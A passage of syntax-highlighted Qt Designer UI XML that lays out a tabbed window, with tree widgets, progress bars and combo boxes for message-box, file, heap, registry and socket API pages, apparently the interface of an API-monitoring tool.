class="name">font</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;layoutDirection&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">enum</span>&gt;</span>Qt::LeftToRight<span class="tag">&lt;/<span class="name">enum</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;currentIndex&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">number</span>&gt;</span>4<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;iconSize&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">width</span>&gt;</span>25<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">height</span>&gt;</span>25<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTreeWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MessageBoxInfo&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>0<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>60<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>491<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>81<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;headerHighlightSections&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bool</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">column</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">string</span> <span class="attr">notr</span>=<span class="string">&quot;true&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">column</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QProgressBar&quot;</span> <span class="attr">name</span>=<span class="string">&quot;progress_message&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>10<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>10<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>81<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>31<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">number</span>&gt;</span>100<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QComboBox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MessageCheckBox&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>190<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>10<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>150<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>31<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sizePolicy&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">sizepolicy</span> <span class="attr">hsizetype</span>=<span class="string">&quot;Fixed&quot;</span> <span class="attr">vsizetype</span>=<span class="string">&quot;Fixed&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">horstretch</span>&gt;</span>0<span class="tag">&lt;/<span class="name">horstretch</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">verstretch</span>&gt;</span>0<span class="tag">&lt;/<span class="name">verstretch</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">sizepolicy</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;minimumSize&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>150<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>30<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;currentIndex&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">number</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTreeWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;FileApiInfo&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>10<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>60<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>471<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>121<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;headerHighlightSections&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bool</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">column</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">string</span> <span class="attr">notr</span>=<span class="string">&quot;true&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">column</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QProgressBar&quot;</span> <span class="attr">name</span>=<span class="string">&quot;progress_file&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>20<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>20<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>81<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>31<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">number</span>&gt;</span>100<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QComboBox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;FileCheckBox&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>220<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>10<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>150<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>31<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;minimumSize&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>150<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>30<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;currentIndex&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">number</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;heap&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTreeWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;HeapApiInfo&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>20<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>60<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>451<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>121<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;headerHighlightSections&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bool</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">column</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">string</span> <span class="attr">notr</span>=<span class="string">&quot;true&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">column</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QProgressBar&quot;</span> <span class="attr">name</span>=<span class="string">&quot;progress_heap&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>40<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>20<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>81<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>31<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">number</span>&gt;</span>100<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QComboBox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;HeapCheckBox&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>230<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>20<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>150<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>31<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;minimumSize&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>150<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>30<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;currentIndex&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">number</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;reg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTreeWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;RegApiInfo&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>10<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>50<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>461<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>131<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;headerHighlightSections&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bool</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">column</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">string</span> <span class="attr">notr</span>=<span class="string">&quot;true&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">column</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QComboBox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;RegCheckBox&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>320<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>10<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>150<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>31<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;minimumSize&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>150<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>30<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;currentIndex&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">number</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QProgressBar&quot;</span> <span class="attr">name</span>=<span class="string">&quot;progress_reg&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>20<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>10<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>81<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>31<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">number</span>&gt;</span>100<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;socket&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTreeWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;SocketApiInfo&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>180<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>70<span class="tag">&lt;/<span 